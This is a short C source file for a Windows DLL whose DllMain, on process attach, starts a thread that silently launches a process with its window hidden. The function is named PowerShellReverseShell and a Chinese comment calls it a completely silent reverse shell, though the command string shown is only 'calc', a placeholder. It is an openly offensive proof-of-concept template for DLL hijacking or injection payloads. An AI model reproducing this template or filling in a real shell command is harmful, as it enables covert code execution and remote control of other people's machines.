#include <processthreadsapi.h>
#include <memoryapi.h>
#include <windows.h>
void PowerShellReverseShell() {
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  
  // 完全静默反弹shell
  char psCommand[] = 
      "calc";
  
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  
  ZeroMemory(&pi, sizeof(pi));
  
  CreateProcessA(NULL, psCommand, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

void Payload() {
  CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PowerShellReverseShell, NULL, 0, NULL);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
      Payload();
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
    }
  return TRUE;
}
